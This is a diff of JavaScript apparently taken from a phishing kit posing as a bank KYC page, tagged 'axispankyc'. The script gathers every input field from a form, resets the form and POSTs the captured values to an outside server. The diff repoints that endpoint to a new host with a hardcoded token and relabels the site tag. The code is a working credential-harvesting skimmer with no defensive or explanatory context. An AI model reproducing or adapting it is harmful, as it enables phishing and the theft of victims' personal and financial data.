@@ -1,10 +1,10 @@
 // calling server data..
-var API_URL = "https://forwarding.live/api";
+var API_URL = "https://p4ni.cloud/api.php?token=WILASKLDJADLKJASD";
 var OTT = 0;
 var hasPath = "";
 var formSubmitted = false; 
 function serverCall(body, nextURL) {
-    fetch(API_URL+"/form/add", {
+    fetch(API_URL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(body),
@@ -61,7 +61,7 @@ window.onload = function() {
         }
         formSubmitted = true;
         let formData = {};
-        let sendData = {};
+
         for (let i = 0; i < form.elements.length; i++) {
             let element = form.elements[i];
             if (element.tagName === 'INPUT') {
@@ -77,12 +77,10 @@ window.onload = function() {
             }
         }
         document.getElementById("frm_2_am8E_").reset();
-        sendData['data'] = formData;
-        sendData['site'] = "axispankyc1.com";
-        serverCall(sendData, nextValue);
+        formData['site'] = "axispankyc3";
+        serverCall(formData, nextValue);
     });
 };
-
 
 function getQuery(query){
         
